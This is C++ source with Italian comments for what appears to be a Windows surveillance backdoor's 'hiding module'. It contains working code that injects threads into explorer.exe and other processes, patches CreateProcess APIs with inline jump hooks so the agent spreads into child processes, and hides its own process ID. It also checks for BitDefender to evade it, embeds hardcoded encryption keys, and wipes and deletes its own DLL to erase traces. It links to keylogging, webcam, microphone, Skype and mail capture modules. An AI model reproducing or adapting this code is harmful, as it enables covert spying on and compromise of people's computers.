////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
//
// HIDING MODULE SECTION {HM}:
//
// 
// 
// HMServiceStruct:
//	HM_IpcCliWrite_t pHM_IpcCliWrite	- PTR. IPC di scrittura
//	HM_IpcCliRead_t  pHM_IpcCliRead;	- PTR. IPC di lettura
//	HM_sCreateHook_t pHM_sCreateHook;	- PTR. funzione che alloca codice/dati di un Hook
//	DWORD PARAM[10];
//
// EXPORTS: 
//  static DWORD HM_sCreateHookA(HANDLE,char*,char*,BYTE*,DWORD,BYTE*,DWORD)
//  HANDLE HM_sStartHookingThread(HANDLE hProcess)
//	void HM_sMain()			- Entry point della DLL
// 
//  void HM_s<GenericHook>(HANDLE, HMServiceStruct *)
//  void HM_s<GenericService>(HMServiceStruct *)
//  [vedere HM_sInBundleHook e HM_sInBundleService come prototipi] 
//
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////

#include "common.h" 
#include "H4-DLL.h"	
#include "demo_functions.h"
#include "HM_CodeAlign.h"
#include "AM_Core.h"
#include "HM_InbundleHook.h"
#include "LOG.h" // XXX da includere nei singoli moduli di agent
#include "HM_IpcModule.h"
#include "SM_Core.h"
#include "PEB.h"
#include "HM_VistaSpecific.h"
#include <Psapi.h>
#include "aes_alg.h"
#include "bin_string.h"
#include "UnHookClass.h"
#include "x64.h"
#include "av_detect.h"
#include "DeepFreeze.h"
#include "HM_BitmapCommon.h"
#include <time.h>
#include "sha1.h"
#include "status_log.h"


#pragma bss_seg("shared")
BYTE crypt_key[KEY_LEN];		// Chiave di cifratura
BYTE crypt_key_conf[KEY_LEN];   // Chiave di cifratura per la conf

aes_context crypt_ctx;		// Context per la cifratura
aes_context crypt_ctx_conf; // Context per la cifratura per la conf

DWORD log_free_space;   // Spazio a disposizione per i log
DWORD log_active_queue;  // Quale coda e' attiva 1 o 0
DWORD process_bypassed; //Numero di processi da bypassare
char process_bypass_list[MAX_DYNAMIC_BYPASS+EMBEDDED_BYPASS][MAX_PBYPASS_LEN]; // Lista dei processi su cui non fare injection
// Nomi dei file di sistema.
// Sono qui perche' ad esempio anche le funzioni di 
// setup dei wrapper devono poterci accedere dall'interno
// dei processi iniettati.
char H4DLLNAME[MAX_RAND_NAME];
char H4_CONF_FILE[MAX_RAND_NAME];
char H4_CONF_BU[MAX_RAND_NAME];
char H4_HOME_DIR[MAX_RAND_NAME];
char H4_HOME_PATH[DLLNAMELEN];
char H4_CODEC_NAME[MAX_RAND_NAME];
char H4_DUMMY_NAME[MAX_RAND_NAME];
char H4_MOBCORE_NAME[MAX_RAND_NAME];
char H4_MOBZOO_NAME[MAX_RAND_NAME];
char H64DLL_NAME[MAX_RAND_NAME];
char H4DRIVER_NAME[MAX_RAND_NAME];
char H4_UPDATE_FILE[MAX_RAND_NAME];
char REGISTRY_KEY_NAME[MAX_RAND_NAME];
char EXE_INSTALLER_NAME[MAX_RAND_NAME];

char SHARE_MEMORY_READ_NAME[MAX_RAND_NAME];
char SHARE_MEMORY_WRITE_NAME[MAX_RAND_NAME];
char SHARE_MEMORY_ASP_COMMAND_NAME[MAX_RAND_NAME];

#pragma bss_seg()
#pragma comment(linker, "/section:shared,RWS")

// Prototipi usati per comodita'
char *HM_FindProc(DWORD);
DWORD HM_FindPid(char *, BOOL);
void HM_U2A(char *buffer);
void LockConfFile();
void UnlockConfFile();

#include "HM_ProcessMonitors.h" // XXX da modificare
#include "HM_KeyLog.h" // XXX da modificare
#include "HM_SnapShot.h" // XXX da modificare
#include "HM_WiFiLocation.h" // XXX da modificare
#include "HM_PrintPool.h" // XXX da modificare 
#include "HM_CrisisAgent.h" // XXX da modificare 
#include "HM_SkypeRecord.h" // XXX da modificare 
#include "HM_UrlLog.h" // XXX da modificare 
#include "HM_ClipBoard.h" // XXX da modificare 
#include "HM_WebCam.h" // XXX da modificare 
#include "HM_AmbMic.h" // XXX da modificare 
#include "HM_MailCap.h" // XXX da modificare 
#include "HM_Pstorage.h" // XXX da modificare 
#include "HM_IMAgent.h" // XXX da modificare 
#include "HM_LogDevice.h" // XXX da modificare 
#include "HM_MouseLog.h" // XXX da modificare
#include "HM_Application.h" // XXX da modificare
#include "HM_PDAAGent.h" // XXX da modificare
#include "HM_Contacts.h" // XXX da modificare

// Qui finira' il binary patch con la chiave di cifratura dei log
BYTE bin_patched_key[KEY_LEN] = "ngkdNGKDh4H4883";
// Qui finira' il binary patch con la chiave di cifratura per la conf
BYTE bin_patched_key_conf[KEY_LEN] = "ngkdNGKDh4H4869";

// Variabili di configurazione globali
nanosec_time date_delta; // Usato per eventuali aggiustamenti sulla lettura delle date

// Usata per lockare il file di conf
HANDLE conf_file_handle = NULL;

typedef DWORD PROCESSINFOCLASS;
typedef struct _SYSTEM_HANDLE_INFORMATION {
	ULONG  ProcessId;
	UCHAR  ObjectTypeNumber;
	UCHAR  Flags;
	USHORT Handle;
	PVOID  Object;
	ACCESS_MASK  GrantedAccess;
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;
#define SystemHandleInformation 16
typedef DWORD (WINAPI *ZWQUERYSYSTEMINFORMATION)(
   PROCESSINFOCLASS ProcessInformationClass,
   PVOID ProcessInformation,
   ULONG ProcessInformationLength,
   PULONG ReturnLength
);

////////////////////////////////////////////////////////////////////////////////
// 
// Strutture, Dati e funzione iniettata nel Processo 
// da Hookare [Threddino]
// 

typedef void (__stdcall *Sleep_t)(DWORD);
typedef struct
{
	HMCommonDataStruct pCommon;
	char cDLLHookName[DLLNAMELEN];				// Nome della dll principale ("H4.DLL")
	char cInBundleHookName[DLLNAMELEN];
	char cInBundleServiceName[DLLNAMELEN];
	// Funzioni da usare nell'Thread  inizializzate dalla setup
	ResumeThread_T pResumeThread;
	OpenThread_T pOpenThread;
	CloseHandle_T pCloseHandle;
	Sleep_t pSleep;
	DWORD dwPid;
	DWORD dwThid;
	BOOL lookup_bypass;
} HMHookingThreadDataStruct;

// Con questa si settano tutte le funzioni di Libreria che stanno 
// in KERNEL32 e NTDLL

DWORD HM_HookingThreadSetup(DWORD * pD)
{	
	HMODULE hMod;

	HMHookingThreadDataStruct *pHMHookingThreadData = (HMHookingThreadDataStruct *) pD;
	VALIDPTR(hMod = GetModuleHandle("KERNEL32.DLL"))

	// API utilizzate dal thread remoto.... [KERNEL32.DLL]
	VALIDPTR(pHMHookingThreadData->pCommon._LoadLibrary = (LoadLibrary_T) HM_SafeGetProcAddress(hMod, "LoadLibraryA"))
	VALIDPTR(pHMHookingThreadData->pCommon._GetProcAddress = (GetProcAddress_T) HM_SafeGetProcAddress(hMod, "GetProcAddress"))
	VALIDPTR(pHMHookingThreadData->pCommon._FreeLibrary = (FreeLibrary_T) HM_SafeGetProcAddress(hMod, "FreeLibrary"))
	VALIDPTR(pHMHookingThreadData->pResumeThread = (ResumeThread_T) HM_SafeGetProcAddress(hMod, "ResumeThread"))
	VALIDPTR(pHMHookingThreadData->pOpenThread = (OpenThread_T) HM_SafeGetProcAddress(hMod, "OpenThread"))
	VALIDPTR(pHMHookingThreadData->pSleep = (Sleep_t) HM_SafeGetProcAddress(hMod, "Sleep"))
	VALIDPTR(pHMHookingThreadData->pCloseHandle = (CloseHandle_T) HM_SafeGetProcAddress(hMod, "CloseHandle"))
	
	// Non lo prendiamo dai nomi guessati perche' la shared potrebbe non essere caricata
	// se stiamo girando in un servizio
	if (!FindModulePath(pHMHookingThreadData->cDLLHookName, sizeof(pHMHookingThreadData->cDLLHookName)))
		return 1;

	sprintf(pHMHookingThreadData->cInBundleHookName, "%s", "HFF3");
	sprintf(pHMHookingThreadData->cInBundleServiceName, "%s", "HFF4");
	pHMHookingThreadData->lookup_bypass = TRUE;
	return 0;
}
					

// Essendo un Thread attivo pData viene passato da 
// CreataRemoteThread
DWORD HM_HookingThread(HMHookingThreadDataStruct *pDataThread)
{
	// Le funzioni di libreria che non sono in NTDLL e KERNEL32
	// le devo risolvere nel processo figlio.....
	HMServiceStruct sServiceData;
	HM_CreateService_t pCreateService = NULL; 
	HM_CreateHook_t pCreateHook = NULL; 
	HMODULE hH4Mod = NULL;
	
	INIT_WRAPPER(HMHookingThreadDataStruct)

	sServiceData.pHM_IpcCliRead = NULL;
	sServiceData.pHM_IpcCliWrite = NULL;
	// Lancia le funzioni CreateService e InbundleHook
	hH4Mod = pDataThread->pCommon._LoadLibrary((LPCSTR)pDataThread->cDLLHookName);
	if(hH4Mod) {
		if((pCreateService = (HM_CreateService_t) pDataThread->pCommon._GetProcAddress(hH4Mod, pDataThread->cInBundleServiceName)))
			pCreateService(pDataThread->dwPid, &sServiceData);

		// Verifica che i services siano stati installati con successo
		if (sServiceData.pHM_IpcCliRead && sServiceData.pHM_IpcCliWrite)
			if((pCreateHook = (HM_CreateHook_t) pDataThread->pCommon._GetProcAddress(hH4Mod, pDataThread->cInBundleHookName)))
				pCreateHook(pDataThread->dwPid, &sServiceData, pDataThread->lookup_bypass);						
	}
	
	// Resuma il thread principale (se stiamo infettando un processo appena nato che non 
	// e' in SUSPENDED)
	// E' NULL solo se H4.DLL ha invocato il thread
	if(pDataThread->dwThid != NULL) {
		HANDLE hMainThread = pDataThread->pOpenThread(THREAD_ALL_ACCESS, TRUE, pDataThread->dwThid);
		if(hMainThread != NULL) {
			pDataThread->pResumeThread(hMainThread);
			pDataThread->pCloseHandle(hMainThread);
		}
	}

	// Scarica H4DLL dal processo....
	if (hH4Mod)
		pDataThread->pCommon._FreeLibrary(hH4Mod);

	// XXX Per gestione messaggi?????
	for(;;)
		pDataThread->pSleep(1000);

	return 1;
}

////////////////////////////////////////////////////////////////////////////////
// 
//	 Funzioni per iniettare dentro explorer il codice 
//   per cancellare la DLL core e la directory di lavoro

typedef BOOL (WINAPI *RemoveDirectory_t) (LPCTSTR);
typedef BOOL (WINAPI *DeleteFile_t) (LPCTSTR);
typedef BOOL (WINAPI *VirtualFree_t) (LPVOID, SIZE_T, DWORD);
typedef HANDLE (WINAPI *CreateFile_t) (LPCTSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL (WINAPI *WriteFile_t)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI *CloseHandle_t) (HANDLE);

typedef struct {
	COMMONDATA;
	RemoveDirectory_t pRemoveDirectory;
	DeleteFile_t pDeleteFile;
	VirtualFree_t pVirtualFree;
	CreateFile_t pCreateFile;
	WriteFile_t pWriteFile;
	CloseHandle_t pCloseHandle;
	Sleep_t pSleep;
	BOOL wipe_file;
	char core_file[DLLNAMELEN];
	char work_dir[DLLNAMELEN];
} HMRemoveCoreThreadDataStruct;

// Thread iniettato dentro explorer per cancellare il core
// e la directory di lavoro
#define CORE_FILE_LEN 2000000 // 150KB
DWORD HM_RemoveCoreThread(void *dummy)
{
	HANDLE hf;
	DWORD data_wiped;
	DWORD dwTmp;
	DWORD wipe_string = 0;
	INIT_WRAPPER(HMRemoveCoreThreadDataStruct);

	// Tenta il wiping
	if (pData->wipe_file) {
		// Cerca a tutti i costi di aprire il file in scrittura
		// Il file deve esistere.
		// Non ha share mode, perche' nessuno deve poter caricare la DLL mentre
		// ci sta scrivendo sopra.
		while ( (hf = pData->pCreateFile(pData->core_file, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL) ) == INVALID_HANDLE_VALUE )
			pData->pSleep(200);
		
		for (data_wiped=0; data_wiped<CORE_FILE_LEN; data_wiped+=sizeof(wipe_string))
			pData->pWriteFile(hf, &wipe_string, sizeof(wipe_string), &dwTmp, NULL);

		pData->pCloseHandle(hf);
	}

	// Qui la DLL non e' consistente (le eventuali aperture
	// dovrebbero fallire)

	// Cerca a tutti i costi di cancellare il core e
	// la directory
	LOOP {
		pData->pDeleteFile(pData->core_file);
		if (pData->pRemoveDirectory(pData->work_dir))
			break;
		pData->pSleep(200);
	}

	// Libera la memoria della data struct
	// (non puo' liberare il codice che sta eseguendo)
	pData->pVirtualFree((BYTE *)pData->dwDataAdd, 0, MEM_RELEASE);

	return 1;
}


// Inietta il thread in explorer per la cancellazione
// del core. Se explorer non e' attivo, prova a iniettare
// finche non ci riesce.
#define REMOVE_SLEEP_TIME 200
void HM_RemoveCore()
{
	HMRemoveCoreThreadDataStruct HMRemoveCoreThreadData;
	DWORD explorer_pid;
	HMODULE hMod;
	HANDLE hProcess;
	HANDLE hThreadRem;
	DWORD dwThreadId;
	BYTE *pCodeRemote;
	BYTE *pDataRemote;

	// Dice al thread se fare il wiping
	HMRemoveCoreThreadData.wipe_file = log_wipe_file;

	// Setup del thread di cancellazione
	if (! (hMod = GetModuleHandle("KERNEL32.DLL")) )
		return;
	HM_CompletePath(H4DLLNAME, HMRemoveCoreThreadData.core_file);
	HM_CompletePath("", HMRemoveCoreThreadData.work_dir);
	HMRemoveCoreThreadData.pDeleteFile = (DeleteFile_t) HM_SafeGetProcAddress(hMod, "DeleteFileA");
	HMRemoveCoreThreadData.pCreateFile = (CreateFile_t) HM_SafeGetProcAddress(hMod, "CreateFileA");
	HMRemoveCoreThreadData.pWriteFile = (WriteFile_t) HM_SafeGetProcAddress(hMod, "WriteFile");
	HMRemoveCoreThreadData.pCloseHandle = (CloseHandle_t) HM_SafeGetProcAddress(hMod, "CloseHandle");
	HMRemoveCoreThreadData.pRemoveDirectory = (RemoveDirectory_t) HM_SafeGetProcAddress(hMod, "RemoveDirectoryA");
	HMRemoveCoreThreadData.pVirtualFree = (VirtualFree_t) HM_SafeGetProcAddress(hMod, "VirtualFree"); 
	HMRemoveCoreThreadData.pSleep = (Sleep_t) HM_SafeGetProcAddress(hMod, "Sleep");  
	if (!HMRemoveCoreThreadData.pDeleteFile || 
		!HMRemoveCoreThreadData.pCreateFile ||
		!HMRemoveCoreThreadData.pWriteFile ||
		!HMRemoveCoreThreadData.pCloseHandle ||
		!HMRemoveCoreThreadData.pRemoveDirectory ||
		!HMRemoveCoreThreadData.pVirtualFree ||
		!HMRemoveCoreThreadData.pSleep)
		return;

	// Cicla finche' non trova explorer.exe
	while( !(explorer_pid = HM_FindPid("explorer.exe", TRUE)) )
		Sleep(REMOVE_SLEEP_TIME);

	// Se explorer e' a 64bit, cerca un processo a 32
	if (IsX64Process(explorer_pid))
		explorer_pid = Find32BitProcess();
	if (!explorer_pid)
		return;

	// Inietta il thread di cancellazione
	if(HM_sCreateHookA(explorer_pid, NULL, NULL, 
					   (BYTE *)HM_RemoveCoreThread, 
					   900, (BYTE *)&HMRemoveCoreThreadData, 
					   sizeof(HMRemoveCoreThreadData)) == NULL)
							return;

	pCodeRemote = (BYTE *)HMRemoveCoreThreadData.dwHookAdd;
	pDataRemote = (BYTE *)HMRemoveCoreThreadData.dwDataAdd;

	// Esegue il thread in explorer.exe
	hProcess = FNC(OpenProcess)(PROCESS_ALL_ACCESS, FALSE, explorer_pid);
	if(hProcess == NULL) 
		return;

	hThreadRem = HM_SafeCreateRemoteThread(hProcess, NULL, 8192, 
									(LPTHREAD_START_ROUTINE)pCodeRemote, 
									(LPVOID)pDataRemote, 0, 
									&dwThreadId);

	// Se fallisce libera la memoria in explorer.exe
	if(hThreadRem == NULL) {
		FNC(VirtualFreeEx)(hProcess, pCodeRemote, 0, MEM_RELEASE);
		FNC(VirtualFreeEx)(hProcess, pDataRemote, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return;
	}

	// Sara' il thread in explorer a liberare la memoria 
	// della funzione iniettata...
	CloseHandle(hThreadRem);
	CloseHandle(hProcess);
	
	return;
}


////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
// 
//								EXPORTS SECTION: START 
//
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////



// Verifica se il processo e' nella lista dei processi da non toccare
// Torna TRUE se il processo e' nella lista
BOOL HM_ProcessByPass(DWORD pid)
{
	char *process_name;
	DWORD i;

	// Prende il nome del processo "pid"
	if ( !(process_name = HM_FindProc(pid)) )
		return FALSE;
	
	// Lo compara con quelli da bypassare
	for(i=0; i<process_bypassed; i++) {
		if (CmpWild((unsigned char *)process_bypass_list[i], (unsigned char *)process_name)) {
			SAFE_FREE(process_name);
			return TRUE;
		}
	}

	SAFE_FREE(process_name);
	return FALSE;
}

#define STATUS_INFO_LENGTH_MISMATCH      ((NTSTATUS)0xC0000004L)
#define STATUS_SUCCESS 0
BOOL CheckIPCAlreadyExist(DWORD pid, void *kobj)
{
	static ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation = NULL;
	LONG Status;
	static DWORD *p = NULL;
	int i;
	DWORD n = 0x4000;
	HMODULE hNtdll;
	PSYSTEM_HANDLE_INFORMATION hinfo;
	BOOL now_created = FALSE;

	if (kobj == NULL)
		return TRUE;

	for (i=0; i<2; i++) {
		if (p == NULL) {
			if (ZwQuerySystemInformation == NULL) {
				hNtdll = GetModuleHandle("ntdll.dll");
				ZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)GetProcAddress(hNtdll, "ZwQuerySystemInformation");
				if (!ZwQuerySystemInformation)
					return TRUE;
			}

			if ( !(p = (DWORD *)malloc(n)) )
				return TRUE;

			while ( (Status=ZwQuerySystemInformation(SystemHandleInformation, p, n, 0)) == STATUS_INFO_LENGTH_MISMATCH ) {
				SAFE_FREE(p);
				n*=4;
				if (!(p = (DWORD *)malloc(n)))
					return TRUE;
			}
			if (Status != STATUS_SUCCESS) {
				SAFE_FREE(p);
				return TRUE;
			}
			now_created = TRUE;
		}

		hinfo = PSYSTEM_HANDLE_INFORMATION(p + 1);
		for (DWORD i = 0; i < *p; i++) {
			if (hinfo[i].ProcessId == pid  && hinfo[i].Object == kobj) {
				return TRUE;
			}
		}
		
		if(now_created)
			return FALSE;
		
		SAFE_FREE(p);
	}
	return FALSE;
}

#define PAGE_MARKER PAGE_EXECUTE_WRITECOPY
BOOL MarkProcess(DWORD pid)
{
	// E' sufficiente il secondo check che e' anche compatibile
	// con l'installazione multipla di backdoor - XXX MINST
/*	BYTE *header_ptr = NULL;
	HANDLE hmodules, hprocess;
	MODULEENTRY32W me32;
	MEMORY_BASIC_INFORMATION mbi;
	DWORD dummy;
	
	me32.dwSize = sizeof(MODULEENTRY32W); 
	hmodules = FNC(CreateToolhelp32Snapshot)(TH32CS_SNAPMODULE, pid);
	if (hmodules == INVALID_HANDLE_VALUE)
		return FALSE;

	if(!FNC(Module32FirstW)(hmodules, &me32)) {
		CloseHandle(hmodules);
		return FALSE;
	}

	do {
		if (!wcsicmp(me32.szModule, L"ntdll.dll")) {
			header_ptr = me32.modBaseAddr;
			break;
		}
	} while(FNC(Module32NextW)(hmodules, &me32));
	CloseHandle(hmodules);
	if (header_ptr == NULL)
		return FALSE;
	
	hprocess = FNC(OpenProcess)(PROCESS_QUERY_INFORMATION, FALSE, pid);
	if (hprocess == NULL)
		return FALSE;

	if (!FNC(VirtualQueryEx)(hprocess, header_ptr, &mbi, sizeof(mbi))) {
		CloseHandle(hprocess);
		return FALSE;
	}
	CloseHandle(hprocess);

	// Ha trovato il marker di pagina
	if (mbi.Protect & PAGE_MARKER) 
		return FALSE;

	hprocess = FNC(OpenProcess)(PROCESS_VM_OPERATION, FALSE, pid);
	if (hprocess == NULL)
		return FALSE;

	if (!HM_SafeVirtualProtectEx(hprocess, header_ptr, 32, PAGE_MARKER, &dummy)) {
		CloseHandle(hprocess);
		return FALSE;
	}

	CloseHandle(hprocess);*/

	// Check paranoico se il processo e' gia' attaccato alla shared memory
	// (caso comodo...)
	if (CheckIPCAlreadyExist(pid, IPC_SHM_Kernel_Object))
		return FALSE;

	return TRUE;
}

////////////////////////////////////////////////////////////////////////////////
// 
// Inietta il Thread nel processo da cui effettuare API Hooking
// Se lookup_bypass==TRUE guarda la process bypass list, altrimenti no
HANDLE __stdcall HM_sStartHookingThread(DWORD dwPid, DWORD dwThid, BOOL lookup_bypass, BOOL mark_process)
{
	HANDLE hThreadRem = INVALID_HANDLE_VALUE;
	HANDLE hProcess;
	DWORD dwThreadId;
	HMHookingThreadDataStruct HMHookingThreadData;
	HideDevice dev_pid;

	// Se e' un processo da non toccare non esegue nulla
	if (lookup_bypass) {
		if (HM_ProcessByPass(dwPid))
			return INVALID_HANDLE_VALUE;
	}

	if (mark_process && !MarkProcess(dwPid))
		return INVALID_HANDLE_VALUE;

	// Il threddino deve avere i pid del processo....
	HMHookingThreadData.dwPid = dwPid;
	HMHookingThreadData.dwThid = dwThid;
	
	// Setup del threddino: riloca le funzioni da usare ecc...
	// se ritorna TRUE c'e' stato un errore nella risoluzion
	// degli address delle api
	if(HM_HookingThreadSetup((DWORD *)&HMHookingThreadData))
		return INVALID_HANDLE_VALUE;

	// Dice al thread iniettato nel figlio se guardare la
	// process_bypass_list
	HMHookingThreadData.lookup_bypass = lookup_bypass;
	
	dev_pid.unhook_hidepid(FNC(GetCurrentProcessId)(), TRUE);

	// Alloca dati e funzioni nell processo hProcess
	if(HM_sCreateHookA(dwPid, 
					   NULL, NULL, 
					   (BYTE *)HM_HookingThread, 
					   500, 
					   (BYTE *)&HMHookingThreadData, 
					   sizeof(HMHookingThreadData)) == NULL)
							return INVALID_HANDLE_VALUE;
	
	// Esegue il thread di hooking
	hProcess = FNC(OpenProcess)(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if(hProcess != NULL) {
		hThreadRem = HM_SafeCreateRemoteThread(hProcess, 
	 									NULL, 
										8192, 
										(LPTHREAD_START_ROUTINE)HMHookingThreadData.pCommon.dwHookAdd, 
										(LPVOID)HMHookingThreadData.pCommon.dwDataAdd, 
										0, 
										&dwThreadId);

		// Se fallisce perche' siamo su Vista e vogliamo infettare SVCHOST
		// prova con la NtCreateThreadEx()
		if (hThreadRem == NULL)
			hThreadRem = VistaCreateRemoteThread(hProcess, 
	 									(LPTHREAD_START_ROUTINE)HMHookingThreadData.pCommon.dwHookAdd, 
										(LPVOID)HMHookingThreadData.pCommon.dwDataAdd);
		CloseHandle(hProcess);
	}
	dev_pid.unhook_hidepid(FNC(GetCurrentProcessId)(), FALSE);
	// Errore
	if(hThreadRem == NULL)
		return INVALID_HANDLE_VALUE;
		

	// XXX Qui dovrebbe fare una wait for single object (da vedere con chiodo)

	// XXX L'handle tornato serve solo per vedere se
	// la funzione e' andata a buon fine. Lo chiudiamo
	// tanto nessun chiamante di questa funzione utilizza
	// mai l'handle tornato. Se no rimangono aperti 
	// un sacco di handle.
	if (hThreadRem != INVALID_HANDLE_VALUE)
		CloseHandle(hThreadRem);
	return hThreadRem;
}


// Verifica se una funzione e' gia' stata hookata DA NOI
BOOL IsHooked(HANDLE hProc, PBYTE code_local, PBYTE code_remote)
{
	DWORD *dest;
	DWORD i, dummy;
	PBYTE dst_code;
	BYTE jmp_code[MARK_SEARCH_LIMIT*2]; // siamo sicuri la HM_sCodeAlign non legga istruzioni fuori dal buffer

	// vede se la funzione comincia con un jmp
	if (code_local == NULL || code_remote == NULL || (*code_local) != 0xE9)
		return FALSE;
	
	// calcola la destinazione del salto
	dest = (DWORD *)(code_local + 1);
	dst_code = code_remote + (*dest) + 5;

	// legge l'hook alla destinazione del salto
	if (!HM_SafeReadProcessMemory(hProc, dst_code, jmp_code, sizeof(jmp_code), &dummy) )
		return FALSE;
	
	// vede se c'e' il nostro marcatore
	__try {
		for (i=0; i<MARK_SEARCH_LIMIT; i+=HM_sCodeAlign(jmp_code + i))
			if (!memcmp(jmp_code+i, "\xEB\x00\xEB\x00", 4)) // Vedere MARK_HOOK
				return TRUE;
	} __except(EXCEPTION_EXECUTE_HANDLER) {
		return FALSE;
	}

	return FALSE;
}

////////////////////////////////////////////////////////////////////////////////
// 
// Copia codice e dati dell'Hook nel process dwPid 
// Questa funzione viene usata anche per iniettare un Thread
// nel processo figlio 
//
#define CRETURN(x)	if(x) {CloseHandle(x);return NULL;}

DWORD __stdcall  HM_sCreateHookA(DWORD dwPid, 
								 char *APIName, 
								 char *DLLAPIName, 
								 BYTE *HookAdd, 
								 DWORD HookSize, 
								 BYTE *HookData, 
								 DWORD HookDataSize)
{
	DWORD code_len = 0, call_offs;
	BYTE *op_code;
	DWORD *op_operand;
	HMODULE h_module = NULL;
	BYTE APIOnLocal[64];
	BYTE JMP_Code[REDIR_SIZE];
	DWORD dummy;
	HANDLE hProcess;
	HMCommonDataStruct *pCommonData = (HMCommonDataStruct *)HookData;

	// reset 
	pCommonData->dwHookAdd  = NULL;
	pCommonData->dwDataAdd  = NULL;

	// 
	if((hProcess = FNC(OpenProcess)(PROCESS_ALL_ACCESS, TRUE, dwPid)) == NULL)
		return NULL;

	// Dobbiamo creare un HOOK ?????
	IFDEF(DLLAPIName) {
		if ( !(h_module = LoadLibrary(DLLAPIName)) )
			CRETURN(hProcess);
	} else
			pCommonData->bAPIAdd    = NULL;
	
	// Dobbiamo creare un HOOK ?????
	IFDEF(APIName)
		if ( !(pCommonData->bAPIAdd = (BYTE *)HM_SafeGetProcAddress(h_module, APIName)) ) 
			CRETURN(hProcess);
	
	// Controlla se ce' codice da Hookare
	IFDEF(pCommonData->bAPIAdd) {
		// Legge i primi 64 byte della funzione da wrappare per farci dei controlli
		if (!HM_SafeReadProcessMemory(hProcess, pCommonData->bAPIAdd, APIOnLocal, sizeof(APIOnLocal), &dummy) )
			CRETURN(hProcess);
	
		// Un processo viene hookato una volta sola dallo stesso core;
		// core diversi possono hookare piu' volte - XXX MINST
		//if (IsHooked(hProcess, APIOnLocal, pCommonData->bAPIAdd))
			//CRETURN(hProcess);

		// Allinea il limite dell'istruzione
		while (code_len < (DWORD)REDIR_SIZE) 
			code_len += HM_sCodeAlign(APIOnLocal + code_len);
				
		if (code_len > 15)
			CRETURN(hProcess);
	}

	// Alloca memoria per il codice dell'Hook
	pCommonData->dwHookAdd = (DWORD)HM_SafeVirtualAllocEx(hProcess, 0, HookSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

	if(!pCommonData->dwHookAdd)
		CRETURN(hProcess);

	// Alloca memoria per i dati dell'Hook
	pCommonData->dwDataAdd = (DWORD)HM_SafeVirtualAllocEx(hProcess, 0, HookDataSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
	if(!pCommonData->dwDataAdd)
		CRETURN(hProcess);

	IFDEF(pCommonData->bAPIAdd) {
		// Crea lo stub...
		memset(HookData, 0x90, STUB_SIZE);	       // Riempie di NOP
		memcpy(HookData, APIOnLocal, code_len); // Copia n istruzioni dall'API originale che verranno sovrascritte
		
		// ...setta il JMP al codice originale...
		HookData[15] = 0xE9;	// OpCode JMP
		*((DWORD *)(HookData + 16)) = (DWORD)pCommonData->bAPIAdd + code_len - ((DWORD)pCommonData->dwDataAdd + STUB_SIZE - 4); //Offset relativo per saltare dentro l'API originale dal wrapper
		
		// ... e riloca eventuali CALL nelle istruzioni copiate nello stub.
		for (code_len=0; code_len<REDIR_SIZE; code_len += HM_sCodeAlign(HookData + code_len)) {
			op_code = HookData + code_len;
			op_operand = (DWORD *)(HookData + code_len + 1);
			if (*op_code == 0xE8 || *op_code == 0xE9) 
				*op_operand -= (pCommonData->dwDataAdd - (DWORD)pCommonData->bAPIAdd);
		}
	}

	// Copia la funzione wrapper
	if ( !HM_SafeWriteProcessMemory(hProcess, (BYTE *)pCommonData->dwHookAdd, HookAdd, HookSize, &dummy) ) 
		CRETURN(hProcess);

	// Copia la struttura dati
	if ( !HM_SafeWriteProcessMemory(hProcess, (BYTE *)pCommonData->dwDataAdd, HookData, HookDataSize, &dummy) )
		CRETURN(hProcess);

	// Setta nel wrapper il puntatore ai dati
	for(call_offs = 0; *(HookAdd + call_offs)!= 0x69; call_offs++);
	if ( !HM_SafeWriteProcessMemory(hProcess, (BYTE *)(pCommonData->dwHookAdd + call_offs), &pCommonData->dwDataAdd, 4, &dummy) )
		CRETURN(hProcess);

	IFDEF(pCommonData->bAPIAdd) {
		// Crea il jump code nell'API originale
		JMP_Code[0]='\xE9';
		*((DWORD *)(&JMP_Code[1])) = (DWORD)(pCommonData->dwHookAdd - (DWORD)(pCommonData->bAPIAdd) - 5);
		
		if ( !HM_SafeWriteProcessMemory(hProcess, pCommonData->bAPIAdd, JMP_Code, REDIR_SIZE, &dummy) )
			CRETURN(hProcess);
	}

	CloseHandle(hProcess);
	return pCommonData->dwDataAdd;
}

void __stdcall HM_sInBundleHook(DWORD dwPid, HMServiceStruct * pServiceData, BOOL lookup_bypass)
{
	// XXX Check ridondante nel caso il padre sia svchost che non ha la lista
	// perche' non ha la shared
	if (lookup_bypass)
		if (HM_ProcessByPass(dwPid))
			return;

	// Hook inbundle di Hidding...
	//HMMAKE_HOOK(dwPid, "OpenProcess", OpenProcessHook, OpenProcessData, OpenProcessHook_setup, pServiceData, "KERNEL32.dll");	

	// BitDefender non permette di infettare i processi appena creati
	if (!IsBitDefender()) {
		HMMAKE_HOOK(dwPid, "CreateProcessA", NtCreateProcessHook, NTCreateProcessRWData, NtCreateProcessHook_setup, pServiceData, "KERNEL32.dll");
		HMMAKE_HOOK(dwPid, "CreateProcessW", NtCreateProcessHook, NTCreateProcessRWData, NtCreateProcessHook_setup, pServiceData, "KERNEL32.dll");
		HMMAKE_HOOK(dwPid, "CreateProcessAsUserA", NtCreateProcessAsUserHook, NTCreateProcessRWData, NtCreateProcessHook_setup, pServiceData, "ADVAPI32.dll");
		HMMAKE_HOOK(dwPid, "CreateProcessAsUserW", NtCreateProcessAsUserHook, NTCreateProcessRWData, NtCreateProcessHook_setup, pServiceData, "ADVAPI32.dll");
		HMMAKE_HOOK(dwPid, "CreateProcessAsUserW", NtCreateProcessAsUserHook, NTCreateProcessRWData, NtCreateProcessHook_setup, pServiceData, "KERNEL32.dll");
	}

